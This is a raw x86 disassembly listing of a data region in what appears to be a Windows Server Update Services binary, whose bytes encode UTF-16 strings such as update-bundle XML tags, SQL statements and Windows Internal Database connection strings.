  409ba5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409ba9:	3e 00 00             	add    %al,%ds:(%eax)
  409bac:	4b                   	dec    %ebx
  409bad:	09 00                	or     %eax,(%eax)
  409baf:	09 00                	or     %eax,(%eax)
  409bb1:	09 00                	or     %eax,(%eax)
  409bb3:	3c 00                	cmp    $0x0,%al
  409bb5:	75 00                	jne    0x409bb7
  409bb7:	70 00                	jo     0x409bb9
  409bb9:	64 00 3a             	add    %bh,%fs:(%edx)
  409bbc:	00 41 00             	add    %al,0x0(%ecx)
  409bbf:	74 00                	je     0x409bc1
  409bc1:	4c                   	dec    %esp
  409bc2:	00 65 00             	add    %ah,0x0(%ebp)
  409bc5:	61                   	popa
  409bc6:	00 73 00             	add    %dh,0x0(%ebx)
  409bc9:	74 00                	je     0x409bcb
  409bcb:	4f                   	dec    %edi
  409bcc:	00 6e 00             	add    %ch,0x0(%esi)
  409bcf:	65 00 20             	add    %ah,%gs:(%eax)
  409bd2:	00 49 00             	add    %cl,0x0(%ecx)
  409bd5:	73 00                	jae    0x409bd7
  409bd7:	43                   	inc    %ebx
  409bd8:	00 61 00             	add    %ah,0x0(%ecx)
  409bdb:	74 00                	je     0x409bdd
  409bdd:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  409be1:	6f                   	outsl  %ds:(%esi),(%dx)
  409be2:	00 72 00             	add    %dh,0x0(%edx)
  409be5:	79 00                	jns    0x409be7
  409be7:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  409bec:	00 72 00             	add    %dh,0x0(%edx)
  409bef:	75 00                	jne    0x409bf1
  409bf1:	65 00 22             	add    %ah,%gs:(%edx)
  409bf4:	00 3e                	add    %bh,(%esi)
  409bf6:	00 00                	add    %al,(%eax)
  409bf8:	80 95 09 00 09 00 09 	adcb   $0x9,0x90009(%ebp)
  409bff:	00 09                	add    %cl,(%ecx)
  409c01:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409c04:	75 00                	jne    0x409c06
  409c06:	70 00                	jo     0x409c08
  409c08:	64 00 3a             	add    %bh,%fs:(%edx)
  409c0b:	00 55 00             	add    %dl,0x0(%ebp)
  409c0e:	70 00                	jo     0x409c10
  409c10:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409c14:	74 00                	je     0x409c16
  409c16:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409c1a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409c1e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c1f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409c23:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409c27:	00 20                	add    %ah,(%eax)
  409c29:	00 55 00             	add    %dl,0x0(%ebp)
  409c2c:	70 00                	jo     0x409c2e
  409c2e:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409c32:	74 00                	je     0x409c34
  409c34:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409c38:	44                   	inc    %esp
  409c39:	00 3d 00 22 00 30    	add    %bh,0x30002200
  409c3f:	00 66 00             	add    %ah,0x0(%esi)
  409c42:	61                   	popa
  409c43:	00 31                	add    %dh,(%ecx)
  409c45:	00 32                	add    %dh,(%edx)
  409c47:	00 30                	add    %dh,(%eax)
  409c49:	00 31                	add    %dh,(%ecx)
  409c4b:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  409c4f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c52:	33 00                	xor    (%eax),%eax
  409c54:	33 00                	xor    (%eax),%eax
  409c56:	30 00                	xor    %al,(%eax)
  409c58:	2d 00 34 00 66       	sub    $0x66003400,%eax
  409c5d:	00 61 00             	add    %ah,0x0(%ecx)
  409c60:	38 00                	cmp    %al,(%eax)
  409c62:	2d 00 38 00 61       	sub    $0x61003800,%eax
  409c67:	00 65 00             	add    %ah,0x0(%ebp)
  409c6a:	39 00                	cmp    %eax,(%eax)
  409c6c:	2d 00 62 00 38       	sub    $0x38006200,%eax
  409c71:	00 37                	add    %dh,(%edi)
  409c73:	00 37                	add    %dh,(%edi)
  409c75:	00 34 00             	add    %dh,(%eax,%eax,1)
  409c78:	37                   	aaa
  409c79:	00 33                	add    %dh,(%ebx)
  409c7b:	00 62 00             	add    %ah,0x0(%edx)
  409c7e:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  409c82:	34 00                	xor    $0x0,%al
  409c84:	31 00                	xor    %eax,(%eax)
  409c86:	22 00                	and    (%eax),%al
  409c88:	20 00                	and    %al,(%eax)
  409c8a:	2f                   	das
  409c8b:	00 3e                	add    %bh,(%esi)
  409c8d:	00 01                	add    %al,(%ecx)
  409c8f:	29 09                	sub    %ecx,(%ecx)
  409c91:	00 09                	add    %cl,(%ecx)
  409c93:	00 09                	add    %cl,(%ecx)
  409c95:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409c98:	2f                   	das
  409c99:	00 75 00             	add    %dh,0x0(%ebp)
  409c9c:	70 00                	jo     0x409c9e
  409c9e:	64 00 3a             	add    %bh,%fs:(%edx)
  409ca1:	00 41 00             	add    %al,0x0(%ecx)
  409ca4:	74 00                	je     0x409ca6
  409ca6:	4c                   	dec    %esp
  409ca7:	00 65 00             	add    %ah,0x0(%ebp)
  409caa:	61                   	popa
  409cab:	00 73 00             	add    %dh,0x0(%ebx)
  409cae:	74 00                	je     0x409cb0
  409cb0:	4f                   	dec    %edi
  409cb1:	00 6e 00             	add    %ch,0x0(%esi)
  409cb4:	65 00 3e             	add    %bh,%gs:(%esi)
  409cb7:	00 00                	add    %al,(%eax)
  409cb9:	2d 09 00 09 00       	sub    $0x90009,%eax
  409cbe:	3c 00                	cmp    $0x0,%al
  409cc0:	2f                   	das
  409cc1:	00 75 00             	add    %dh,0x0(%ebp)
  409cc4:	70 00                	jo     0x409cc6
  409cc6:	64 00 3a             	add    %bh,%fs:(%edx)
  409cc9:	00 50 00             	add    %dl,0x0(%eax)
  409ccc:	72 00                	jb     0x409cce
  409cce:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409cd2:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  409cd6:	75 00                	jne    0x409cd8
  409cd8:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409cde:	74 00                	je     0x409ce0
  409ce0:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409ce4:	3e 00 00             	add    %al,%ds:(%eax)
  409ce7:	2d 09 00 09 00       	sub    $0x90009,%eax
  409cec:	3c 00                	cmp    $0x0,%al
  409cee:	75 00                	jne    0x409cf0
  409cf0:	70 00                	jo     0x409cf2
  409cf2:	64 00 3a             	add    %bh,%fs:(%edx)
  409cf5:	00 42 00             	add    %al,0x0(%edx)
  409cf8:	75 00                	jne    0x409cfa
  409cfa:	6e                   	outsb  %ds:(%esi),(%dx)
  409cfb:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409cff:	00 65 00             	add    %ah,0x0(%ebp)
  409d02:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409d06:	70 00                	jo     0x409d08
  409d08:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409d0c:	74 00                	je     0x409d0e
  409d0e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409d12:	3e 00 00             	add    %al,%ds:(%eax)
  409d15:	43                   	inc    %ebx
  409d16:	09 00                	or     %eax,(%eax)
  409d18:	09 00                	or     %eax,(%eax)
  409d1a:	09 00                	or     %eax,(%eax)
  409d1c:	3c 00                	cmp    $0x0,%al
  409d1e:	75 00                	jne    0x409d20
  409d20:	70 00                	jo     0x409d22
  409d22:	64 00 3a             	add    %bh,%fs:(%edx)
  409d25:	00 55 00             	add    %dl,0x0(%ebp)
  409d28:	70 00                	jo     0x409d2a
  409d2a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409d2e:	74 00                	je     0x409d30
  409d30:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409d34:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409d38:	6e                   	outsb  %ds:(%esi),(%dx)
  409d39:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409d3d:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  409d41:	00 20                	add    %ah,(%eax)
  409d43:	00 55 00             	add    %dl,0x0(%ebp)
  409d46:	70 00                	jo     0x409d48
  409d48:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409d4c:	74 00                	je     0x409d4e
  409d4e:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409d52:	44                   	inc    %esp
  409d53:	00 3d 00 22 00 00    	add    %bh,0x2200
  409d59:	2f                   	das
  409d5a:	09 00                	or     %eax,(%eax)
  409d5c:	09 00                	or     %eax,(%eax)
  409d5e:	3c 00                	cmp    $0x0,%al
  409d60:	2f                   	das
  409d61:	00 75 00             	add    %dh,0x0(%ebp)
  409d64:	70 00                	jo     0x409d66
  409d66:	64 00 3a             	add    %bh,%fs:(%edx)
  409d69:	00 42 00             	add    %al,0x0(%edx)
  409d6c:	75 00                	jne    0x409d6e
  409d6e:	6e                   	outsb  %ds:(%esi),(%dx)
  409d6f:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409d73:	00 65 00             	add    %ah,0x0(%ebp)
  409d76:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409d7a:	70 00                	jo     0x409d7c
  409d7c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409d80:	74 00                	je     0x409d82
  409d82:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409d86:	3e 00 00             	add    %al,%ds:(%eax)
  409d89:	2b 09                	sub    (%ecx),%ecx
  409d8b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409d8e:	2f                   	das
  409d8f:	00 75 00             	add    %dh,0x0(%ebp)
  409d92:	70 00                	jo     0x409d94
  409d94:	64 00 3a             	add    %bh,%fs:(%edx)
  409d97:	00 52 00             	add    %dl,0x0(%edx)
  409d9a:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  409d9f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409da3:	00 6f 00             	add    %ch,0x0(%edi)
  409da6:	6e                   	outsb  %ds:(%esi),(%dx)
  409da7:	00 73 00             	add    %dh,0x0(%ebx)
  409daa:	68 00 69 00 70       	push   $0x70006900
  409daf:	00 73 00             	add    %dh,0x0(%ebx)
  409db2:	3e 00 00             	add    %al,%ds:(%eax)
  409db5:	81 0f 3c 00 2f 00    	orl    $0x2f003c,(%edi)
  409dbb:	75 00                	jne    0x409dbd
  409dbd:	70 00                	jo     0x409dbf
  409dbf:	64 00 3a             	add    %bh,%fs:(%edx)
  409dc2:	00 55 00             	add    %dl,0x0(%ebp)
  409dc5:	70 00                	jo     0x409dc7
  409dc7:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409dcb:	74 00                	je     0x409dcd
  409dcd:	65 00 3e             	add    %bh,%gs:(%esi)
  409dd0:	00 27                	add    %ah,(%edi)
  409dd2:	00 2c 00             	add    %ch,(%eax,%eax,1)
  409dd5:	40                   	inc    %eax
  409dd6:	00 55 00             	add    %dl,0x0(%ebp)
  409dd9:	70 00                	jo     0x409ddb
  409ddb:	73 00                	jae    0x409ddd
  409ddd:	74 00                	je     0x409ddf
  409ddf:	72 00                	jb     0x409de1
  409de1:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409de5:	6d                   	insl   (%dx),%es:(%edi)
  409de6:	00 53 00             	add    %dl,0x0(%ebx)
  409de9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409ded:	76 00                	jbe    0x409def
  409def:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409df3:	4c                   	dec    %esp
  409df4:	00 6f 00             	add    %ch,0x0(%edi)
  409df7:	63 00                	arpl   %eax,(%eax)
  409df9:	61                   	popa
  409dfa:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  409dfe:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  409e02:	00 31                	add    %dh,(%ecx)
  409e04:	00 2c 00             	add    %ch,(%eax,%eax,1)
  409e07:	40                   	inc    %eax
  409e08:	00 49 00             	add    %cl,0x0(%ecx)
  409e0b:	6d                   	insl   (%dx),%es:(%edi)
  409e0c:	00 70 00             	add    %dh,0x0(%eax)
  409e0f:	6f                   	outsl  %ds:(%esi),(%dx)
  409e10:	00 72 00             	add    %dh,0x0(%edx)
  409e13:	74 00                	je     0x409e15
  409e15:	65 00 64 00 3d       	add    %ah,%gs:0x3d(%eax,%eax,1)
  409e1a:	00 40 00             	add    %al,0x0(%eax)
  409e1d:	69 00 49 00 6d 00    	imul   $0x6d0049,(%eax),%eax
  409e23:	70 00                	jo     0x409e25
  409e25:	6f                   	outsl  %ds:(%esi),(%dx)
  409e26:	00 72 00             	add    %dh,0x0(%edx)
  409e29:	74 00                	je     0x409e2b
  409e2b:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  409e30:	00 6f 00             	add    %ch,0x0(%edi)
  409e33:	75 00                	jne    0x409e35
  409e35:	74 00                	je     0x409e37
  409e37:	70 00                	jo     0x409e39
  409e39:	75 00                	jne    0x409e3b
  409e3b:	74 00                	je     0x409e3d
  409e3d:	2c 00                	sub    $0x0,%al
  409e3f:	40                   	inc    %eax
  409e40:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409e44:	00 63 00             	add    %ah,0x0(%ebx)
  409e47:	61                   	popa
  409e48:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  409e4c:	00 65 00             	add    %ah,0x0(%ebp)
  409e4f:	76 00                	jbe    0x409e51
  409e51:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409e57:	6f                   	outsl  %ds:(%esi),(%dx)
  409e58:	00 6e 00             	add    %ch,0x0(%esi)
  409e5b:	49                   	dec    %ecx
  409e5c:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  409e60:	00 40 00             	add    %al,0x0(%eax)
  409e63:	69 00 4c 00 6f 00    	imul   $0x6f004c,(%eax),%eax
  409e69:	63 00                	arpl   %eax,(%eax)
  409e6b:	61                   	popa
  409e6c:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  409e70:	00 65 00             	add    %ah,0x0(%ebp)
  409e73:	76 00                	jbe    0x409e75
  409e75:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409e7b:	6f                   	outsl  %ds:(%esi),(%dx)
  409e7c:	00 6e 00             	add    %ch,0x0(%esi)
  409e7f:	49                   	dec    %ecx
  409e80:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  409e84:	00 6f 00             	add    %ch,0x0(%edi)
  409e87:	75 00                	jne    0x409e89
  409e89:	74 00                	je     0x409e8b
  409e8b:	70 00                	jo     0x409e8d
  409e8d:	75 00                	jne    0x409e8f
  409e8f:	74 00                	je     0x409e91
  409e91:	2c 00                	sub    $0x0,%al
  409e93:	40                   	inc    %eax
  409e94:	00 55 00             	add    %dl,0x0(%ebp)
  409e97:	70 00                	jo     0x409e99
  409e99:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409e9d:	74 00                	je     0x409e9f
  409e9f:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  409ea3:	6d                   	insl   (%dx),%es:(%edi)
  409ea4:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  409ea8:	00 6f 00             	add    %ch,0x0(%edi)
  409eab:	6d                   	insl   (%dx),%es:(%edi)
  409eac:	00 70 00             	add    %dh,0x0(%eax)
  409eaf:	72 00                	jb     0x409eb1
  409eb1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409eb5:	73 00                	jae    0x409eb7
  409eb7:	65 00 64 00 3d       	add    %ah,%gs:0x3d(%eax,%eax,1)
  409ebc:	00 4e 00             	add    %cl,0x0(%esi)
  409ebf:	55                   	push   %ebp
  409ec0:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  409ec4:	00 01                	add    %al,(%ecx)
  409ec6:	49                   	dec    %ecx
  409ec7:	73 00                	jae    0x409ec9
  409ec9:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  409ece:	00 63 00             	add    %ah,0x0(%ebx)
  409ed1:	74 00                	je     0x409ed3
  409ed3:	20 00                	and    %al,(%eax)
  409ed5:	40                   	inc    %eax
  409ed6:	00 69 00             	add    %ch,0x0(%ecx)
  409ed9:	49                   	dec    %ecx
  409eda:	00 6d 00             	add    %ch,0x0(%ebp)
  409edd:	70 00                	jo     0x409edf
  409edf:	6f                   	outsl  %ds:(%esi),(%dx)
  409ee0:	00 72 00             	add    %dh,0x0(%edx)
  409ee3:	74 00                	je     0x409ee5
  409ee5:	65 00 64 00 2c       	add    %ah,%gs:0x2c(%eax,%eax,1)
  409eea:	00 20                	add    %ah,(%eax)
  409eec:	00 40 00             	add    %al,0x0(%eax)
  409eef:	69 00 4c 00 6f 00    	imul   $0x6f004c,(%eax),%eax
  409ef5:	63 00                	arpl   %eax,(%eax)
  409ef7:	61                   	popa
  409ef8:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  409efc:	00 65 00             	add    %ah,0x0(%ebp)
  409eff:	76 00                	jbe    0x409f01
  409f01:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409f07:	6f                   	outsl  %ds:(%esi),(%dx)
  409f08:	00 6e 00             	add    %ch,0x0(%esi)
  409f0b:	49                   	dec    %ecx
  409f0c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  409f10:	1b 50 00             	sbb    0x0(%eax),%edx
  409f13:	72 00                	jb     0x409f15
  409f15:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409f19:	61                   	popa
  409f1a:	00 72 00             	add    %dh,0x0(%edx)
  409f1d:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  409f21:	75 00                	jne    0x409f23
  409f23:	6e                   	outsb  %ds:(%esi),(%dx)
  409f24:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409f28:	00 65 00             	add    %ah,0x0(%ebp)
  409f2b:	00 3d 50 00 72 00    	add    %bh,0x720050
  409f31:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409f35:	61                   	popa
  409f36:	00 72 00             	add    %dh,0x0(%edx)
  409f39:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  409f3d:	75 00                	jne    0x409f3f
  409f3f:	6e                   	outsb  %ds:(%esi),(%dx)
  409f40:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409f44:	00 65 00             	add    %ah,0x0(%ebp)
  409f47:	20 00                	and    %al,(%eax)
  409f49:	52                   	push   %edx
  409f4a:	00 65 00             	add    %ah,0x0(%ebp)
  409f4d:	76 00                	jbe    0x409f4f
  409f4f:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409f55:	6f                   	outsl  %ds:(%esi),(%dx)
  409f56:	00 6e 00             	add    %ch,0x0(%esi)
  409f59:	20 00                	and    %al,(%eax)
  409f5b:	49                   	dec    %ecx
  409f5c:	00 44 00 3a          	add    %al,0x3a(%eax,%eax,1)
  409f60:	00 20                	add    %ah,(%eax)
  409f62:	00 7b 00             	add    %bh,0x0(%ebx)
  409f65:	30 00                	xor    %al,(%eax)
  409f67:	7d 00                	jge    0x409f69
  409f69:	00 39                	add    %bh,(%ecx)
  409f6b:	45                   	inc    %ebp
  409f6c:	00 72 00             	add    %dh,0x0(%edx)
  409f6f:	72 00                	jb     0x409f71
  409f71:	6f                   	outsl  %ds:(%esi),(%dx)
  409f72:	00 72 00             	add    %dh,0x0(%edx)
  409f75:	20 00                	and    %al,(%eax)
  409f77:	63 00                	arpl   %eax,(%eax)
  409f79:	72 00                	jb     0x409f7b
  409f7b:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409f7f:	74 00                	je     0x409f81
  409f81:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409f87:	20 00                	and    %al,(%eax)
  409f89:	75 00                	jne    0x409f8b
  409f8b:	70 00                	jo     0x409f8d
  409f8d:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409f91:	74 00                	je     0x409f93
  409f93:	65 00 20             	add    %ah,%gs:(%eax)
  409f96:	00 62 00             	add    %ah,0x0(%edx)
  409f99:	75 00                	jne    0x409f9b
  409f9b:	6e                   	outsb  %ds:(%esi),(%dx)
  409f9c:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409fa0:	00 65 00             	add    %ah,0x0(%ebp)
  409fa3:	00 47 0d             	add    %al,0xd(%edi)
  409fa6:	00 0a                	add    %cl,(%edx)
  409fa8:	00 46 00             	add    %al,0x0(%esi)
  409fab:	75 00                	jne    0x409fad
  409fad:	6e                   	outsb  %ds:(%esi),(%dx)
  409fae:	00 63 00             	add    %ah,0x0(%ebx)
  409fb1:	74 00                	je     0x409fb3
  409fb3:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409fb9:	20 00                	and    %al,(%eax)
  409fbb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409fbf:	72 00                	jb     0x409fc1
  409fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  409fc2:	00 72 00             	add    %dh,0x0(%edx)
  409fc5:	20 00                	and    %al,(%eax)
  409fc7:	2d 00 20 00 46       	sub    $0x46002000,%eax
  409fcc:	00 62 00             	add    %ah,0x0(%edx)
  409fcf:	50                   	push   %eax
  409fd0:	00 72 00             	add    %dh,0x0(%edx)
  409fd3:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409fd7:	61                   	popa
  409fd8:	00 72 00             	add    %dh,0x0(%edx)
  409fdb:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  409fdf:	75 00                	jne    0x409fe1
  409fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  409fe2:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409fe6:	00 65 00             	add    %ah,0x0(%ebp)
  409fe9:	2e 00 01             	add    %al,%cs:(%ecx)
  409fec:	0b 23                	or     (%ebx),%esp
  409fee:	00 23                	add    %ah,(%ebx)
  409ff0:	00 57 00             	add    %dl,0x0(%edi)
  409ff3:	49                   	dec    %ecx
  409ff4:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  409ff8:	0d 23 00 23 00       	or     $0x230023,%eax
  409ffd:	53                   	push   %ebx
  409ffe:	00 53 00             	add    %dl,0x0(%ebx)
  40a001:	45                   	inc    %ebp
  40a002:	00 45 00             	add    %al,0x0(%ebp)
  40a005:	00 17                	add    %dl,(%edi)
  40a007:	53                   	push   %ebx
  40a008:	00 65 00             	add    %ah,0x0(%ebp)
  40a00b:	72 00                	jb     0x40a00d
  40a00d:	76 00                	jbe    0x40a00f
  40a00f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a013:	20 00                	and    %al,(%eax)
  40a015:	32 00                	xor    (%eax),%al
  40a017:	30 00                	xor    %al,(%eax)
  40a019:	30 00                	xor    %al,(%eax)
  40a01b:	38 00                	cmp    %al,(%eax)
  40a01d:	00 79 53             	add    %bh,0x53(%ecx)
  40a020:	00 65 00             	add    %ah,0x0(%ebp)
  40a023:	72 00                	jb     0x40a025
  40a025:	76 00                	jbe    0x40a027
  40a027:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a02b:	3d 00 6e 00 70       	cmp    $0x70006e00,%eax
  40a030:	00 3a                	add    %bh,(%edx)
  40a032:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  40a036:	00 2e                	add    %ch,(%esi)
  40a038:	00 5c 00 70          	add    %bl,0x70(%eax,%eax,1)
  40a03c:	00 69 00             	add    %ch,0x0(%ecx)
  40a03f:	70 00                	jo     0x40a041
  40a041:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40a046:	00 53 00             	add    %dl,0x0(%ebx)
  40a049:	53                   	push   %ebx
  40a04a:	00 51 00             	add    %dl,0x0(%ecx)
  40a04d:	4c                   	dec    %esp
  40a04e:	00 24 00             	add    %ah,(%eax,%eax,1)
  40a051:	4d                   	dec    %ebp
  40a052:	00 49 00             	add    %cl,0x0(%ecx)
  40a055:	43                   	inc    %ebx
  40a056:	00 52 00             	add    %dl,0x0(%edx)
  40a059:	4f                   	dec    %edi
  40a05a:	00 53 00             	add    %dl,0x0(%ebx)
  40a05d:	4f                   	dec    %edi
  40a05e:	00 46 00             	add    %al,0x0(%esi)
  40a061:	54                   	push   %esp
  40a062:	00 23                	add    %ah,(%ebx)
  40a064:	00 23                	add    %ah,(%ebx)
  40a066:	00 53 00             	add    %dl,0x0(%ebx)
  40a069:	53                   	push   %ebx
  40a06a:	00 45 00             	add    %al,0x0(%ebp)
  40a06d:	45                   	inc    %ebp
  40a06e:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40a072:	00 71 00             	add    %dh,0x0(%ecx)
  40a075:	6c                   	insb   (%dx),%es:(%edi)
  40a076:	00 5c 00 71          	add    %bl,0x71(%eax,%eax,1)
  40a07a:	00 75 00             	add    %dh,0x0(%ebp)
  40a07d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a081:	79 00                	jns    0x40a083
  40a083:	3b 00                	cmp    (%eax),%eax
  40a085:	44                   	inc    %esp
  40a086:	00 61 00             	add    %ah,0x0(%ecx)
  40a089:	74 00                	je     0x40a08b
  40a08b:	61                   	popa
  40a08c:	00 62 00             	add    %ah,0x0(%edx)
  40a08f:	61                   	popa
  40a090:	00 73 00             	add    %dh,0x0(%ebx)
  40a093:	65 00 3d 00 00 33 3b 	add    %bh,%gs:0x3b330000
  40a09a:	00 49 00             	add    %cl,0x0(%ecx)
  40a09d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a09e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a0a2:	00 67 00             	add    %ah,0x0(%edi)
  40a0a5:	72 00                	jb     0x40a0a7
  40a0a7:	61                   	popa
  40a0a8:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a0ac:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40a0b0:	00 53 00             	add    %dl,0x0(%ebx)
  40a0b3:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40a0b7:	75 00                	jne    0x40a0b9
  40a0b9:	72 00                	jb     0x40a0bb
  40a0bb:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40a0c1:	3d 00 54 00 72       	cmp    $0x72005400,%eax
  40a0c6:	00 75 00             	add    %dh,0x0(%ebp)
  40a0c9:	65 00 00             	add    %al,%gs:(%eax)
  40a0cc:	6d                   	insl   (%dx),%es:(%edi)
  40a0cd:	53                   	push   %ebx
  40a0ce:	00 65 00             	add    %ah,0x0(%ebp)
  40a0d1:	72 00                	jb     0x40a0d3
  40a0d3:	76 00                	jbe    0x40a0d5
  40a0d5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a0d9:	3d 00 6e 00 70       	cmp    $0x70006e00,%eax
  40a0de:	00 3a                	add    %bh,(%edx)
  40a0e0:	00 5c 00 5c          	add    %bl,0x5c(%eax,%eax,1)
  40a0e4:	00 2e                	add    %ch,(%esi)
  40a0e6:	00 5c 00 70          	add    %bl,0x70(%eax,%eax,1)
  40a0ea:	00 69 00             	add    %ch,0x0(%ecx)
  40a0ed:	70 00                	jo     0x40a0ef
  40a0ef:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  40a0f4:	00 49 00             	add    %cl,0x0(%ecx)
  40a0f7:	43                   	inc    %ebx
  40a0f8:	00 52 00             	add    %dl,0x0(%edx)
  40a0fb:	4f                   	dec    %edi
  40a0fc:	00 53 00             	add    %dl,0x0(%ebx)
  40a0ff:	4f                   	dec    %edi
  40a100:	00 46 00             	add    %al,0x0(%esi)
  40a103:	54                   	push   %esp
  40a104:	00 23                	add    %ah,(%ebx)
  40a106:	00 23                	add    %ah,(%ebx)
  40a108:	00 57 00             	add    %dl,0x0(%edi)
  40a10b:	49                   	dec    %ecx
  40a10c:	00 44 00 5c          	add    %al,0x5c(%eax,%eax,1)
  40a110:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a114:	00 71 00             	add    %dh,0x0(%ecx)
  40a117:	6c                   	insb   (%dx),%es:(%edi)
  40a118:	00 5c 00 71          	add    %bl,0x71(%eax,%eax,1)
  40a11c:	00 75 00             	add    %dh,0x0(%ebp)
  40a11f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a123:	79 00                	jns    0x40a125
  40a125:	3b 00                	cmp    (%eax),%eax
  40a127:	44                   	inc    %esp
  40a128:	00 61 00             	add    %ah,0x0(%ecx)
  40a12b:	74 00                	je     0x40a12d
  40a12d:	61                   	popa
  40a12e:	00 62 00             	add    %ah,0x0(%edx)
  40a131:	61                   	popa
  40a132:	00 73 00             	add    %dh,0x0(%ebx)
  40a135:	65 00 3d 00 00 35 3b 	add    %bh,%gs:0x3b350000
  40a13c:	00 20                	add    %ah,(%eax)
  40a13e:	00 49 00             	add    %cl,0x0(%ecx)
  40a141:	6e                   	outsb  %ds:(%esi),(%dx)
  40a142:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a146:	00 67 00             	add    %ah,0x0(%edi)
  40a149:	72 00                	jb     0x40a14b
  40a14b:	61                   	popa
  40a14c:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a150:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40a154:	00 53 00             	add    %dl,0x0(%ebx)
